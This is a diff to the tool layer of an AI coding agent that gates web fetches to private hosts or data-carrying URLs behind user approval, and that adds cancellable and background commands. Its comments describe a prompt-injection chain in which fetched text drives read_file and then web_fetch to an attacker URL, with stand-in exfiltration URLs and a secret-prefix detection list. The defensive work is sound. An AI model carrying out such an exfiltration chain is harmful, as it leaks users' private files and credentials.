@@ -3,7 +3,11 @@ JSON-schema parameters, provider-agnostic) plus a `run(args) -> str`.
 Writes/commands are gated by the caller (agent.py) via approve.py; the tools
 themselves just do the work. Reads and web tools need no approval."""
 
+import atexit
+import re
 import subprocess
+import threading
+import time
 from pathlib import Path
 
 from . import patch as patchmod
@@ -13,10 +17,10 @@ MAX_READ_BYTES = 200_000
 
 # which tools mutate / execute — the caller gates these
 NEEDS_APPROVAL = {"write_file", "edit_file", "run_command", "apply_patch",
-                 "wait_until"}
+                 "wait_until", "cancel_command"}
 
 
-def needs_approval(name: str) -> bool:
+def needs_approval(name: str, args: dict | None = None) -> bool:
     """R119: every `mcp_*` tool call needs approval, unconditionally — MCP
     has no universal "this tool is safe" flag, and Aurora's whole safety
     model is approval-gated writes. A prefix check rather than adding each
@@ -24,7 +28,91 @@ def needs_approval(name: str) -> bool:
     only known once a server's `tools/list` handshake completes, at
     Engine-construction time — this way the rule holds regardless of what
     any given server exposes."""
-    return name in NEEDS_APPROVAL or name.startswith("mcp_")
+    if name in NEEDS_APPROVAL or name.startswith("mcp_"):
+        return True
+    # R283: web_fetch is ungated for an ordinary public page, but NOT when
+    # the URL could reach a private service or carry data out. Only decided
+    # when the caller passes `args` — the mutation checkpoint asks by name
+    # alone, and a fetch mutates nothing.
+    if name == "web_fetch" and args is not None:
+        return url_needs_approval(str(args.get("url", "")))
+    return False
+
+
+def _private_host(host: str, resolve: bool = True) -> bool:
+    """Loopback/private/link-local/reserved literal, a local-only name
+    (localhost, *.local, *.ts.net, *.internal), or a name that RESOLVES to
+    any of those — the SSRF targets (a LAN admin UI, 169.254.169.254).
+
+    R300: `resolve=False` for the pre-approval check. Resolving a name is a
+    DNS query, and a DNS query for `<data>.attacker.example` IS the
+    exfiltration — it used to happen before the user was ever asked. The
+    fetch re-checks the address it actually connects to."""
+    import ipaddress
+    import socket
+    host = (host or "").strip("[]").lower()
+    if not host:
+        return True
+    if host == "localhost" or host.endswith((".local", ".ts.net", ".internal",
+                                             ".localhost", ".lan", ".home")):
+        return True
+    try:
+        addrs = [ipaddress.ip_address(host)]
+    except ValueError:
+        if not resolve:
+            return False
+        try:
+            addrs = [ipaddress.ip_address(ai[4][0].split("%")[0])
+                     for ai in socket.getaddrinfo(host, None)]
+        except (OSError, ValueError):
+            return False      # unresolvable: the fetch itself will just fail
+    return any(not a.is_global for a in addrs)
+
+
+def url_needs_approval(url: str) -> bool:
+    """R283: web_fetch + read_file were both ungated, so injected text in a
+    fetched page could chain read_file(<private file>) → web_fetch(
+    'https://attacker/?d=<contents>') with no prompt at all, or read an
+    internal service. A fetch now asks first when it targets a non-public
+    host or carries a query string (the easy exfil channel). A plain public
+    page — the overwhelmingly common case — still needs no approval."""
+    from urllib.parse import urlsplit
+    try:
+        u = urlsplit(url.strip())
+    except ValueError:
+        return True
+    if u.scheme not in ("http", "https"):
+        return True
+    return (bool(u.query) or _private_host(u.hostname or "", resolve=False)
+            or _looks_like_payload(u))
+
+
+# R300: the query string is not the only channel. Data in the PATH
+# (`https://attacker/AKIAIOSFODNN7EXAMPLE`) or a SUBDOMAIN
+# (`https://<base32>.attacker/`) went out with no prompt. A URL whose path
+# segment or host label looks like encoded data, that names a well-known
+# secret prefix, or that is simply very long, now asks first. Heuristic by
+# nature: a short secret in an ordinary-looking path can still pass — the
+# prompt is the backstop for the common shapes, not a guarantee.
+_SECRET_PREFIXES = ("AKIA", "ASIA", "ghp_", "gho_", "github_pat_", "sk-", "xox",
+                    "glpat-", "AIza", "-----BEGIN")
+_DATA_SEG = re.compile(r"^[A-Za-z0-9+/=_%.-]{40,}$")
+
+
+def _looks_like_payload(u) -> bool:
+    from urllib.parse import unquote
+    if len(u.geturl()) > 200:
+        return True
+    host = (u.hostname or "")
+    if any(len(label) >= 30 for label in host.split(".")):
+        return True
+    path = unquote(u.path or "")
+    for seg in path.split("/"):
+        if _DATA_SEG.match(seg) and not re.fullmatch(r"[0-9a-f]{40}|[0-9a-f]{64}", seg):
+            return True   # a 40/64-hex commit or content hash is ordinary
+        if any(p.lower() in seg.lower() for p in _SECRET_PREFIXES if len(seg) >= 12):
+            return True
+    return False
 
 # R94: tools the agent loop may run CONCURRENTLY within one round. An
 # explicit allowlist, deliberately NOT "everything outside NEEDS_APPROVAL":
@@ -125,7 +213,13 @@ GREP_PRUNE = [".git", "node_modules", ".venv", "venv", "__pycache__",
 MAX_FIND_RESULTS = 500
 
 
-def find_files(pattern: str, path: str = ".", **_) -> str:
+# R292: find_files had no time bound at all (grep has GREP_TIMEOUT) — measured
+# 19.7s walking 812k entries under ~, and unbounded on a bigger tree or a
+# network mount, on the worker thread.
+FIND_TIMEOUT = 30
+
+
+def find_files(pattern: str, path: str = ".", _cancel=None, **_) -> str:
     """Search for files by glob pattern (e.g. '*.py', 'test_*.py'),
     recursively — the filename-search counterpart to `grep`'s content
     search (feature request, 2026-07-27). Uses `os.walk` with the same
@@ -143,9 +237,19 @@ def find_files(pattern: str, path: str = ".", **_) -> str:
     if not root.is_dir():
         return (f"[error: not a directory: {path} — cwd is {Path.cwd()}; "
                 f"use an absolute path or ~/…]")
+    import time as _time
     out: list[str] = []
     truncated = False
+    stopped = ""
+    deadline = _time.monotonic() + FIND_TIMEOUT
     for dirpath, dirnames, filenames in os.walk(root):
+        # R292: once per directory — cheap next to the listing itself
+        if _time.monotonic() > deadline:
+            stopped = f"timed out after {FIND_TIMEOUT}s"
+            break
+        if _cancel is not None and _cancel():
+            stopped = "cancelled by user"
+            break
         dirnames[:] = [d for d in dirnames if d not in GREP_PRUNE]
         for name in filenames:
             rel = (Path(dirpath) / name).relative_to(root).as_posix()
@@ -156,6 +260,10 @@ def find_files(pattern: str, path: str = ".", **_) -> str:
                     break
         if truncated:
             break
+    if stopped:
+        note = (f"[search {stopped} — results are PARTIAL; narrow the "
+                f"path/pattern]")
+        return ("\n".join(sorted(out)) + "\n" + note) if out else note
     if not out:
         return "[no matches]"
     text = "\n".join(sorted(out))
@@ -297,6 +405,23 @@ def grep(pattern: str, path: str = ".", **_) -> str:
         return f"[grep error: {e}]"
 
 
+def _read_for_edit(p: Path) -> tuple[str, bool]:
+    """R269: the file's text for an in-place edit, and whether it is
+    uniformly CRLF. `read_text` translates every CRLF to LF and the write
+    then emitted LF, so ONE edit rewrote a Windows-style file's every line
+    ending. A uniformly-CRLF file is edited in LF form (so a model's
+    LF-joined `old`/hunks still match) and converted back by
+    `_restore_newlines`; anything else is read and written byte-faithfully."""
+    with p.open("r", encoding="utf-8", newline="") as f:
+        raw = f.read()
+    crlf = "\r\n" in raw and raw.count("\n") == raw.count("\r\n")
+    return (raw.replace("\r\n", "\n") if crlf else raw), crlf
+
+
+def _restore_newlines(text: str, crlf: bool) -> str:
+    return text.replace("\n", "\r\n") if crlf else text
+
+
 def write_file(path: str, content: str, **_) -> str:
     # R241: atomic + mode/symlink preserving. `Path.write_text` truncates
     # first, so a crash, ENOSPC or a kill mid-write leaves the user's file
@@ -314,14 +439,20 @@ def edit_file(path: str, old: str, new: str, replace_all: bool = False,
     p = _resolve(path)
     if not p.is_file():
         return f"[error: no such file: {path}]"
-    text = p.read_text(encoding="utf-8")
+    # R270: an empty `old` "occurs" len(text)+1 times — with replace_all it
+    # inserted `new` between every character of the file.
+    if not old:
+        return "[error: `old` must not be empty — use write_file to create or " \
+               "replace a whole file]"
+    text, crlf = _read_for_edit(p)                              # R269
     n = text.count(old)
     if n == 0:
         return "[error: `old` text not found — it must match exactly]"
     if n > 1 and not replace_all:
         return (f"[error: `old` text appears {n} times — make it unique, "
                 f"or pass replace_all=true to change all {n}]")
-    write_text_preserving(p, text.replace(old, new))   # R241
+    write_text_preserving(p, _restore_newlines(text.replace(old, new),
+                                               crlf))   # R241, R269
     return f"[edited {path}]" if n == 1 else f"[edited {path} — {n} occurrences]"
 
 
@@ -338,14 +469,14 @@ def apply_patch(path: str, diff: str, **_) -> str:
         hunks = patchmod.parse(diff)
     except patchmod.PatchError as e:
         return f"[error: {e}]"
-    text = p.read_text(encoding="utf-8")
+    text, crlf = _read_for_edit(p)                              # R269
     try:
         new_text = patchmod.apply(text, hunks)
     except patchmod.PatchError as e:
         return f"[error: {e}]"
     if new_text == text:
         return "[no changes — patch was a no-op]"
-    write_text_preserving(p, new_text)   # R241
+    write_text_preserving(p, _restore_newlines(new_text, crlf))   # R241, R269
     return f"[applied {len(hunks)} hunk(s) to {path}]"
 
 
@@ -373,8 +504,18 @@ def set_command_timeout(seconds: float) -> None:
 COMMAND_OUTPUT_CAP = 5 * 1024 * 1024
 
 
+# R272: how often a running command polls the turn's cancel callback — the
+# same cadence `cancellable_sse` uses for a streaming request.
+_CANCEL_POLL_S = 0.15
+
+
+class CommandCancelled(Exception):
+    """Internal: `_run_command_once` saw its cancel callback go true."""
+
+
 def _run_command_once(command: str, workdir: str | None,
-                      timeout: float | None = None) -> tuple[str, int | None]:
+                      timeout: float | None = None,
+                      cancel=None) -> tuple[str, int | None]:
     """Run one shell command to completion (or `timeout`, default
     COMMAND_TIMEOUT), process-group-safe (R95c). Returns (raw combined
     stdout+stderr, returncode) — returncode is None on a timeout.
@@ -405,7 +546,12 @@ def _run_command_once(command: str, workdir: str | None,
     # grep. Text mode wraps each pipe in a TextIOWrapper, and a buffered read
     # on that blocks until its buffer fills — which would defeat the deadline
     # the read loop below exists to enforce.
+    # R271: stdin=DEVNULL. Inherited, it was the TUI's own terminal (raw mode,
+    # owned by prompt_toolkit): a command that reads stdin — a REPL, a y/N
+    # prompt, `git commit` without -m — fought the TUI for keystrokes or
+    # blocked until COMMAND_TIMEOUT. EOF is the honest answer: nobody can type.
     proc = subprocess.Popen(command, shell=True, cwd=workdir,
+                            stdin=subprocess.DEVNULL,
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             start_new_session=True)
     # Read the group id NOW, while the shell is certainly alive. Looking it
@@ -434,12 +580,19 @@ def _run_command_once(command: str, workdir: str | None,
     timed_out = False
     watch = [proc.stdout, proc.stderr]
     deadline = _time.monotonic() + timeout
+    cancelled = False
     while watch:
         remaining = deadline - _time.monotonic()
         if remaining <= 0:
             timed_out = True
             break
-        ready, _, _ = select.select(watch, [], [], remaining)
+        # R272: poll the turn's cancel between reads — Esc-Esc used to do
+        # nothing until the command exited or hit COMMAND_TIMEOUT (300s).
+        if cancel is not None and cancel():
+            cancelled = True
+            break
+        wait = remaining if cancel is None else min(remaining, _CANCEL_POLL_S)
+        ready, _, _ = select.select(watch, [], [], wait)
         for pipe in ready:
             # raw `os.read`, never a buffered `.read(n)` — see the Popen call
             chunk = os.read(pipe.fileno(), 65536)
@@ -467,6 +620,19 @@ def _run_command_once(command: str, workdir: str | None,
                   "all of it]")
         return s
 
+    if cancelled:
+        _kill_group(proc, pgid)
+        for pipe in (proc.stdout, proc.stderr):
+            try:
+                pipe.close()
+            except OSError:
+                pass
+        try:
+            proc.wait(timeout=1)
+        except subprocess.TimeoutExpired:
+            pass
+        partial = _decoded().strip()
+        raise CommandCancelled(partial)
     if not timed_out:
         # Both pipes are at EOF, which is not the same as "the process has
         # exited" — a double-forked grandchild can close them and leave the
@@ -513,14 +679,233 @@ def _run_command_once(command: str, workdir: str | None,
     return partial, None
 
 
-def run_command(command: str, cwd: str = "", **_) -> str:
+# R245: `run_command`/`wait_until` block the whole agent turn until the
+# command exits — fine for a `pytest` run, useless for a multi-minute model
+# download, where the very next thing the user does is ask "is it done yet?"
+# and that question can't even reach the model until the blocking call
+# returns. `background=True` launches the command detached (same
+# process-group ownership as the foreground path, R95c, so it can still be
+# killed as a whole tree) and returns a job id immediately; `check_command`
+# polls it. Module-level, not per-Engine: a job outlives the tool call that
+# started it, same lifetime class as the MCP servers in mcp.py.
+_BG_LOCK = threading.Lock()
+_BG_JOBS: dict[str, "_BackgroundJob"] = {}
+_BG_NEXT_ID = 1
+# a runaway model that keeps backgrounding jobs and never checks on them
+# must not be able to fork-bomb the host — same reasoning as COMMAND_OUTPUT_CAP
+# bounding a single command's memory instead of trusting the caller to stop.
+MAX_BACKGROUND_JOBS = 4
+# R293: finished jobs kept for check_command. Each holds up to
+# COMMAND_OUTPUT_CAP × 2 (10MB) of output, and nothing ever removed one, so
+# memory grew by up to 10MB per verbose job for the life of the process.
+MAX_FINISHED_JOBS = 8
+
+
+class _BackgroundJob:
+    def __init__(self, job_id: str, command: str, proc, pgid):
+        self.id = job_id
+        self.command = command
+        self.proc = proc
+        self.pgid = pgid
+        self.start = time.monotonic()
+        self.lock = threading.Lock()          # guards everything below
+        self.out_chunks: list[bytes] = []
+        self.err_chunks: list[bytes] = []
+        self.out_len = self.err_len = 0
+        self.truncated = False
+        self.done = False
+        self.returncode: int | None = None
+
+
+def _bg_drain(job: "_BackgroundJob") -> None:
+    """Runs on its own thread for the job's whole lifetime, same
+    incremental-drain shape as `_run_command_once`'s read loop but with no
+    deadline — the job is meant to outlive this call. Marks the job done and
+    records its exit code once both pipes hit EOF and the process reaps."""
+    import os
+    import select
+    watch = [job.proc.stdout, job.proc.stderr]
+    while watch:
+        ready, _, _ = select.select(watch, [], [])
+        for pipe in ready:
+            chunk = os.read(pipe.fileno(), 65536)
+            if not chunk:
+                watch.remove(pipe)
+                continue
+            with job.lock:
+                if pipe is job.proc.stdout:
+                    if job.out_len < COMMAND_OUTPUT_CAP:
+                        job.out_chunks.append(chunk)
+                        job.out_len += len(chunk)
+                    else:
+                        job.truncated = True
+                else:
+                    if job.err_len < COMMAND_OUTPUT_CAP:
+                        job.err_chunks.append(chunk)
+                        job.err_len += len(chunk)
+                    else:
+                        job.truncated = True
+    job.proc.wait()
+    for pipe in (job.proc.stdout, job.proc.stderr):
+        try:
+            pipe.close()
+        except OSError:
+            pass
+    with job.lock:
+        job.done = True
+        job.returncode = job.proc.returncode
+
+
+def _bg_output(job: "_BackgroundJob") -> str:
+    with job.lock:
+        out = b"".join(job.out_chunks).decode("utf-8", errors="replace")
+        err = b"".join(job.err_chunks).decode("utf-8", errors="replace")
+        truncated = job.truncated
+    s = out + err
+    if truncated:
+        s += (f"\n[output truncated at {COMMAND_OUTPUT_CAP} bytes — the "
+              "job kept running; redirect to a file if you need all of it]")
+    return s
+
+
+def _prune_finished_jobs_locked() -> None:
+    """R293: drop the oldest FINISHED jobs beyond MAX_FINISHED_JOBS. Caller
+    holds _BG_LOCK. A running job is never dropped (it still owns a process
+    group and a drain thread)."""
+    finished = [jid for jid, j in _BG_JOBS.items() if j.done]
+    for jid in finished[:max(0, len(finished) - MAX_FINISHED_JOBS)]:
+        del _BG_JOBS[jid]
+
+
+def _start_background(command: str, workdir: str | None) -> str:
+    """Returns a job id, or an `[error: ...]` string at MAX_BACKGROUND_JOBS —
+    same shape as the other tools' error returns, so the model sees it
+    without a separate exception path."""
+    import os
+    global _BG_NEXT_ID
+    with _BG_LOCK:
+        _prune_finished_jobs_locked()                            # R293
+        live = sum(1 for j in _BG_JOBS.values() if not j.done)
+        if live >= MAX_BACKGROUND_JOBS:
+            return (f"[error: {MAX_BACKGROUND_JOBS} background jobs already "
+                    "running — check_command() one to completion, or let "
+                    "one finish, before starting another]")
+        job_id = f"bg{_BG_NEXT_ID}"
+        _BG_NEXT_ID += 1
+    proc = subprocess.Popen(command, shell=True, cwd=workdir,
+                            stdin=subprocess.DEVNULL,           # R271
+                            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                            start_new_session=True)
+    try:
+        pgid = os.getpgid(proc.pid)
+    except OSError:
+        pgid = None
+    job = _BackgroundJob(job_id, command, proc, pgid)
+    with _BG_LOCK:
+        _BG_JOBS[job_id] = job
+    threading.Thread(target=_bg_drain, args=(job,), daemon=True).start()
+    return job_id
+
+
+def _kill_all_background_jobs() -> None:
+    """atexit hook — a background download/build must not outlive the
+    Aurora process that started it and silently keep running/holding
+    resources with no one watching it, the same orphan concern R95c's
+    process-group kill exists to prevent for run_command."""
+    with _BG_LOCK:
+        jobs = list(_BG_JOBS.values())
+    for job in jobs:
+        with job.lock:
+            if job.done:
+                continue
+        _kill_group(job.proc, job.pgid)
+
+
+atexit.register(_kill_all_background_jobs)
+
+
+def check_command(job_id: str = "", tail: int = 4000, **_) -> str:
+    """Poll a job started by `run_command(..., background=True)`. With no
+    `job_id`, lists every known job (running or finished) so the model can
+    ask "what's running?" without having kept the id — e.g. after a compact
+    or a fresh turn that lost track of it. `tail` bounds how much of a
+    long-running job's output comes back per poll, keeping only the END of
+    it — the model is calling this repeatedly to watch progress, not to
+    re-read the whole thing from the start every time."""
+    with _BG_LOCK:
+        jobs = dict(_BG_JOBS)
+    if not job_id:
+        if not jobs:
+            return "[no background jobs]"
+        lines = []
+        for jid, job in sorted(jobs.items()):
+            with job.lock:
+                status = (f"exit {job.returncode}" if job.done
+                          else f"running {time.monotonic() - job.start:.0f}s")
+            lines.append(f"{jid}: {status} — {job.command}")
+        return "\n".join(lines)
+    job = jobs.get(job_id)
+    if job is None:
+        return f"[error: no such background job: {job_id}]"
+    out = _bg_output(job)
+    tail = max(200, int(tail or 4000))
+    if len(out) > tail:
+        out = f"[…{len(out) - tail} earlier bytes omitted…]\n" + out[-tail:]
+    with job.lock:
+        done, code = job.done, job.returncode
+    status = f"[exit {code}]" if done else "[still running]"
+    return f"{status}\n" + (out.strip() or "[no output yet]")
+
+
+def cancel_command(job_id: str, **_) -> str:
+    """Kill a job started by run_command(..., background=True) — R246. A
+    background job is deliberately disconnected from Esc-Esc's
+    `fe.cancel_event` (that event belongs to the current TURN, and the whole
+    point of backgrounding is that the job outlives its turn — see R245), so
+    there was no way to stop one short of it finishing or the whole process
+    exiting (the `_kill_all_background_jobs` atexit hook). Same
+    process-group kill as the foreground path (R95c/`_kill_group`) — reaches
+    the job's real child processes, not just its shell. `_bg_drain`'s own
+    thread observes the pipes closing and marks the job done/returncode
+    itself; this only sends the signal."""
+    with _BG_LOCK:
+        job = _BG_JOBS.get(job_id)
+    if job is None:
+        return f"[error: no such background job: {job_id}]"
+    with job.lock:
+        if job.done:
+            return f"[{job_id}] already finished (exit {job.returncode}) — nothing to cancel"
+    _kill_group(job.proc, job.pgid)
+    return f"[{job_id}] kill signal sent"
+
+
+def _cancelled_text(e: "CommandCancelled") -> str:
+    partial = str(e)
+    return (partial + "\n" if partial else "") + \
+        "[cancelled by user — the command's process group was killed]"
+
+
+def run_command(command: str, cwd: str = "", background: bool = False,
+                _cancel=None, **_) -> str:
     """Run a shell command, optionally in `cwd` (R90g) — otherwise the model
     has to prefix every call with its own `cd … && …` inside the shell
-    string, which breaks as soon as a path needs quoting."""
+    string, which breaks as soon as a path needs quoting. `background=True`
+    (R245) starts it detached and returns immediately with a job id for
+    `check_command` — for anything expected to outlast one turn (a big
+    download, a long build) instead of blocking the whole agent loop on it."""
     workdir = str(_resolve(cwd)) if cwd else None
     if workdir and not Path(workdir).is_dir():
         return f"[error: no such directory: {cwd}]"
-    out, code = _run_command_once(command, workdir)
+    if background:
+        job_id = _start_background(command, workdir)
+        if job_id.startswith("[error:"):
+            return job_id
+        return (f"[background job {job_id} started]\n"
+                f"check on it with check_command(job_id=\"{job_id}\")")
+    try:
+        out, code = _run_command_once(command, workdir, cancel=_cancel)
+    except CommandCancelled as e:                                # R272
+        return _cancelled_text(e)
     if code is None:
         head = f"[timeout after {COMMAND_TIMEOUT}s]"
         return f"{out}\n{head}" if out else head
@@ -528,7 +913,8 @@ def run_command(command: str, cwd: str = "", **_) -> str:
 
 
 def wait_until(command: str, cwd: str = "", interval: float = 2.0,
-              timeout: float = 60.0, then: str = "", **_) -> str:
+              timeout: float = 60.0, then: str = "", _cancel=None,
+              **_) -> str:
     """Repeatedly run `command` until it exits 0 or `timeout` seconds pass
     (R100) — a general "poll until true or give up" tool. Useful for "wait
     for the dev server to be listening", "wait until this file appears",
@@ -571,8 +957,12 @@ def wait_until(command: str, cwd: str = "", interval: float = 2.0,
     while True:
         attempt += 1
         remaining = timeout - (_time.monotonic() - start)
-        out, code = _run_command_once(command, workdir,
-                                      timeout=max(0.1, remaining))
+        try:
+            kw = {"cancel": _cancel} if _cancel is not None else {}
+            out, code = _run_command_once(command, workdir,
+                                          timeout=max(0.1, remaining), **kw)
+        except CommandCancelled as e:                            # R272
+            return _cancelled_text(e)
         shown = out.strip() or "[no output]"
         if code == 0:
             elapsed = _time.monotonic() - start
@@ -580,7 +970,10 @@ def wait_until(command: str, cwd: str = "", interval: float = 2.0,
                     f"{elapsed:.1f}s]\n{shown}")
             if not then:
                 return head
-            then_out, then_code = _run_command_once(then, workdir)
+            try:
+                then_out, then_code = _run_command_once(then, workdir, **kw)
+            except CommandCancelled as e:                        # R272
+                return f"{head}\n{_cancelled_text(e)}"
             then_shown = then_out.strip() or "[no output]"
             then_head = ("[then: timed out]" if then_code is None
                         else f"[then: exit {then_code}]")
@@ -589,7 +982,12 @@ def wait_until(command: str, cwd: str = "", interval: float = 2.0,
             status = "timed out mid-command" if code is None else f"exit {code}"
             return (f"[wait_until: gave up after {attempt} attempt(s), "
                     f"~{timeout:.0f}s ({status}) — last output:]\n{shown}")
-        _time.sleep(interval)
+        # R272: an interruptible sleep between attempts
+        end = _time.monotonic() + interval
+        while _time.monotonic() < end:
+            if _cancel is not None and _cancel():
+                return "[cancelled by user between wait_until attempts]"
+            _time.sleep(min(_CANCEL_POLL_S, end - _time.monotonic()))
 
 
 def _text(v) -> str:
@@ -622,6 +1020,7 @@ RUNNERS = {
     "find_files": find_files,
     "write_file": write_file, "edit_file": edit_file, "run_command": run_command,
     "apply_patch": apply_patch, "wait_until": wait_until,
+    "check_command": check_command, "cancel_command": cancel_command,
 }
 
 SPEC = [
@@ -666,7 +1065,15 @@ SPEC = [
      "parameters": {"type": "object", "properties": {
          "command": {"type": "string"},
          "cwd": {"type": "string",
-                 "description": "directory to run it in (optional)"}},
+                 "description": "directory to run it in (optional)"},
+         "background": {"type": "boolean",
+                        "description": "start it detached and return "
+                                       "immediately with a job id instead "
+                                       "of blocking until it exits — for "
+                                       "anything expected to run longer "
+                                       "than this turn (a big download, a "
+                                       "long build); poll it with "
+                                       "check_command (optional)"}},
          "required": ["command"]}},
     {"name": "apply_patch",
      "description": "Apply a unified diff (like `git diff`/`diff -u` output) "
@@ -707,6 +1114,30 @@ SPEC = [
                                  "immediately after `command` first "
                                  "succeeds (optional)"}},
          "required": ["command"]}},
+    {"name": "check_command",
+     "description": "Poll a job started by run_command(..., "
+                    "background=True) — its status and recent output. "
+                    "With no job_id, lists every known background job. "
+                    "Read-only, no approval needed.",
+     "parameters": {"type": "object", "properties": {
+         "job_id": {"type": "string",
+                    "description": "id returned by run_command's "
+                                   "background=True (optional — omit to "
+                                   "list all jobs)"},
+         "tail": {"type": "integer",
+                  "description": "max characters of output to return, "
+                                 "most-recent-first (default 4000)"}},
+         "required": []}},
+    {"name": "cancel_command",
+     "description": "Kill a job started by run_command(..., "
+                    "background=True) (asks approval). It keeps running "
+                    "until this is called, a check_command call finding it "
+                    "already exited, or the Aurora process itself exits.",
+     "parameters": {"type": "object", "properties": {
+         "job_id": {"type": "string",
+                    "description": "id returned by run_command's "
+                                   "background=True"}},
+         "required": ["job_id"]}},
 ]
 
 
@@ -841,11 +1272,19 @@ def result_status(out: str) -> str:
     return "ok"
 
 
-def run_tool(name: str, args: dict) -> str:
+# R272: builtins that honour the turn's cancel callback while they block.
+_CANCELLABLE = {"run_command", "wait_until", "find_files"}   # R292
+
+
+def run_tool(name: str, args: dict, cancel=None) -> str:
     for table in (RUNNERS, _EXTENSION_RUNNERS):
         if name in table:
             try:
-                out = table[name](**args)
+                if cancel is not None and table is RUNNERS \
+                        and name in _CANCELLABLE:
+                    out = table[name](**args, _cancel=cancel)
+                else:
+                    out = table[name](**args)
                 # R144b: inside the guard. An extension's runner (user-authored,
                 # and `extensions.py` never states str as a hard contract) that
                 # returns None/dict/int made `len(out)` below raise TypeError
@@ -869,7 +1308,7 @@ def run_tool(name: str, args: dict) -> str:
     return f"[error: unknown tool '{name}']"
 
 
-def run_tools_parallel(calls: list) -> dict[int, str]:
+def run_tools_parallel(calls: list, cancel=None) -> dict[int, str]:
     """Run several PARALLEL_SAFE calls at once (R94). `calls` is a list of
     (index, name, args); returns {index: output}. Every tool here only reads
     the filesystem or the network, and `run_tool` already swallows every
@@ -878,8 +1317,12 @@ def run_tools_parallel(calls: list) -> dict[int, str]:
     original order — approvals, secret challenges and the transcript stay
     strictly sequential, only the waiting overlaps."""
     from concurrent.futures import ThreadPoolExecutor
+    def _run(n, a):
+        return run_tool(n, a, cancel=cancel) if cancel is not None else run_tool(n, a)
     if len(calls) < 2:
-        return {i: run_tool(n, a) for i, n, a in calls}
+        return {i: _run(n, a) for i, n, a in calls}
     with ThreadPoolExecutor(max_workers=min(len(calls), MAX_PARALLEL)) as pool:
-        futures = {i: pool.submit(run_tool, n, a) for i, n, a in calls}
+        # R302: the turn's cancel reaches batched calls too (R292's
+        # cancellable find_files was uncancellable inside a batch).
+        futures = {i: pool.submit(_run, n, a) for i, n, a in calls}
         return {i: f.result() for i, f in futures.items()}
